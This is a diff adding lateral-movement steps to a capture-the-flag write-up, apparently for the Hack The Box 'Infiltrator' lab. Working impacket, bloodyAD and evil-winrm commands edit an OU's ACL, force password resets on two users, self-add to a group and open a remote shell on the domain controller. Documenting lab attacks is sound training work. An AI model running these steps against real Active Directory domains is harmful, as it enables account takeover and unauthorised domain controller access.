@@ -676,16 +676,16 @@ Bingo! `d.anderson` has a pathway to `DC01` with `e.rodriguez` and `m.harris` in
 
 ```mermaid
 flowchart TD
-  A(d.anderson) -->|GenericAll| B("marketing digital (OU)")
+  A(d.anderson) -->|GenericAll| B("MARKETING DIGITAL (OU)")
   B -->|Contains| C(e.rodriguez)
-  C -->|AddSelf| D("chiefs marketing (Group)")
+  C -->|AddSelf| D("CHIEFS MARKETING (Group)")
   D -->|ForceChangePassword| E("m.harris")
   E -->|CanPSRemote| F("DC01 (Domain Controller)")
 ```
 
 ## 5. Lateral movement
 
-### 5.1. Generating TGT
+### 5.1. Generating TGT for `d.anderson`
 
 Attempting to get TGT with `d.anderson` account resutled in `KRB_AP_ERR_SKEW(Clock skew too great)` error:
 
@@ -727,4 +727,194 @@ root@kali:~# impacket-getTGT infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-i
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Saving ticket in d.anderson.ccache
+
+root@kali:~# export KRB5CCNAME=d.anderson.ccache
+```
+
+### 5.2. Edit ACL of `MARKETING DIGITAL` to grant `Full Control` to `d.anderson`
+
+- Utilize the `GenericAll` permissions to modify the ACL of the `MARKETING DIGITAL` OU
+- This allows `d.anderson` full control on accounts in the OU, effectively bypassing any previous restrictions imposed on direct access
+
+```console
+root@kali:~# impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip dc01.infiltrator.htb
+
+[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+[*] DACL backed up to dacledit-20241226-141003.bak
+[*] DACL modified successfully!
+```
+
+### 5.3. Change password of `e.rodriguez`
+
+With the full control permission that `d.anderson` now has on `MARKETING DIGITAL`, change the password for `e.rodriguez` to gain access to this account
+
+> [!Tip]
+>
+> bloodyAD is used to perform specific LDAP calls to a domain controller for AD privesc
+> 
+> It supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc
+>
+> Install bloodyAD in Kali with `apt -y install bloodyAD`
+
+```console
+root@kali:~# bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb --dc-ip 10.10.11.31 -u d.anderson -k set password e.rodriguez Pass1234
+[+] Password changed successfully!
+```
+
+### 5.4. Use `e.rodriguez` to `AddSelf` to `CHIEFS MARKETING`
+
+#### 5.4.1. Generating TGT for e.rodriguez`
+
+```console
+root@kali:~# impacket-getTGT infiltrator.htb/e.rodriguez:Pass1234 -dc-ip dc01.infiltrator.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in e.rodriguez.ccache
+
+root@kali:~# export KRB5CCNAME=e.rodriguez.ccache
+```
+
+#### 5.4.2. Adding self to group
+
+```console
+root@kali:~# bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb --dc-ip 10.10.11.31 -u e.rodriguez -k add groupMember 'CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB' e.rodriguez
+[+] e.rodriguez added to CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB
+```
+
+### 5.5. Change password of `m.harris`
+
+```console
+root@kali:~# bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb --dc-ip 10.10.11.31 -u e.rodriguez -k set password m.harris Pass1234
+[+] Password changed successfully!
+```
+
+### 5.6. Use `m.harris` to access `DC01`
+
+#### 5.6.1. Generating TGT for m.harris`
+
+```console
+root@kali:~# impacket-getTGT infiltrator.htb/m.harris:Pass1234 -dc-ip dc01.infiltrator.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in m.harris.ccache
+
+root@kali:~# export KRB5CCNAME=m.harris.ccache
+```
+
+#### 5.6.2. Use `evil-winrm` to get a shell `DC01`
+
+The KDC for `infiltrator.htb` could not be located:
+
+```console
+root@kali:~# evil-winrm -i dc01.infiltrator.htb -u m.harris -r infiltrator.htb
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: User is not needed for Kerberos auth. Ticket will be used
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
+Cannot find KDC for realm "INFILTRATOR.HTB"
+
+
+Error: Exiting with code 1
+```
+
+Create `/etc/krb5.conf` to point to `dc01.infiltrator.htb` as KDC
+
+```sh
+cat << EOF > /etc/krb5.conf
+[libdefaults]
+    default_realm = INFILTRATOR.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    forwardable = true
+[realms]
+    INFILTRATOR.HTB = {
+        kdc = dc01.infiltrator.htb
+        admin_server = dc01.infiltrator.htb
+    }
+[domain_realm]
+    .infiltrator.htb = INFILTRATOR.HTB
+    infiltrator.htb = INFILTRATOR.HTB
+EOF
+```
+
+tah-dah:
+
+```console
+root@kali:~# evil-winrm -i dc01.infiltrator.htb -u m.harris -r infiltrator.htb
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: User is not needed for Kerberos auth. Ticket will be used
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\M.harris\Documents> whoami
+infiltrator\m.harris
+```
+
+```cmd
+*Evil-WinRM* PS C:\Users\M.harris\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== ==============================================
+infiltrator\m.harris S-1-5-21-2606098828-3734741516-3625406802-1105
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ==================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+INFILTRATOR\Protected Users                 Group            S-1-5-21-2606098828-3734741516-3625406802-525  Mandatory group, Enabled by default, Enabled group
+INFILTRATOR\Developers                      Group            S-1-5-21-2606098828-3734741516-3625406802-1112 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+Get the user flag first:
+
+```cmd
+*Evil-WinRM* PS C:\Users\M.harris\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\M.harris\Desktop> type user.txt
+•••flag-redacted•••
 ```
